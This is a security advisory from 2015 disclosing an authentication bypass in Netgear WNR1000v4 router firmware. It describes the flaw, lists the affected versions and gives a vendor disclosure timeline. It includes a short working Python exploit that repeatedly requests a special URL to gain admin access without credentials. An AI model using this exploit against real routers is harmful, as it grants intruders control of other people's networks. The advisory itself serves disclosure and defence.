'''
# Exploit Title: Netgear_WNR1000v4_AuthBypass
# Google Dork: -
# Date: 06.10.2015
# Exploit Author: Daniel Haake
# Vendor Homepage: http://www.netgear.com/
# Software Link: http://downloadcenter.netgear.com/en/product/WNR1000v4
# Version: N300 router firmware versions 1.1.0.24 - 1.1.0.31
# Tested on: Can be exploited using a browser
# CVE : requested


Introduction:
-------------
Multiple NETGEAR wireless routers are out of the box vulnerable
to an authentication bypass attack. No router options has to
be changed to exploit the issue. So an attacker can access the administration
interface of the router without submitting any valid username and
password, just by requesting a special URL several times.


Affected:
---------
- Router Firmware: N300_1.1.0.31_1.0.1.img
- Router Firmware; N300-1.1.0.28_1.0.1.img
- Router Firmware; N300-1.1.0.24_1.0.1.img
- tested and confirmed on the WNR1000v4 Router with both firmwares
- other products may also be vulnerable because the firmware is used in multiple devices


Technical Description:
----------------------
The attacker can exploit the issue by using a browser or writing a simple exploit.
1. When a user wants to access the web interface, a http basic authentication login process is initiated
2. If he does not know the username and password he gets redirected to the 401_access_denied.htm file
3. An attacker now has to call the URL http://<ROUTER-IP>/BRS_netgear_success.html multiple times
-> After that if he can access the administration web interface and there is no username/password prompt


Example Python script:
----------------------
'''

import os
import urllib2
import time
import sys

try:
	first = urllib2.urlopen("http://" + sys.argv[1])
	print "No password protection!"
except:
	print "Password protection detected!"
	print "Executing exploit..."
	for i in range(0,3):
		time.sleep(1)
		urllib2.urlopen("http://" + sys.argv[1] + "/BRS_netgear_success.html")

	second = urllib2.urlopen("http://" + sys.argv[1])
	if second.getcode() == 200:
		print "Bypass successfull. Now use your browser to have a look at the admin interface."

'''
Workaround/Fix:
---------------
None so far. A patch already fixing this vulnerability was developed by Netgear but not released so far
(see timeline below).


Timeline:
---------
Vendor Status: works on patch-release
'''
21.07.2015: Vendor notified per email (security@netgear.com)
            -> No response
23.07.2015: Vendor notified via official chat support
24.07.2015: Support redirected notification to the technical team
29.07.2015: Requested status update and asked if they need further assistance
            -> No response
21.08.2015: Notified vendor that we will go full disclosure within 90 days if they do not react
03.09.2015: Support again said that they will redirect it to the technical team
03.09.2015: Netgear sent some beta firmware version to look if the vulnerability is fixed
03.09.2015: Confirmed to Netgear that the problem is solved in this version
            Asked Netgear when they plan to release the firmware with this security fix
11.09.2015: Response from Netgear saying they will not disclose the patch release day
15.09.2015: Asked Netgear again when they plan to publish the security fix for the second time
            -> No response
29.09.2015: Full disclosure of this vulnerability by SHELLSHOCK LABS
06.10.2015: Forced public release of this advisory to follow up on [2]


References:
-----------
[1] http://support.netgear.com/product/WNR1000v4
[2] http://www.shellshocklabs.com/2015/09/part-1en-hacking-netgear-jwnr2010v5.html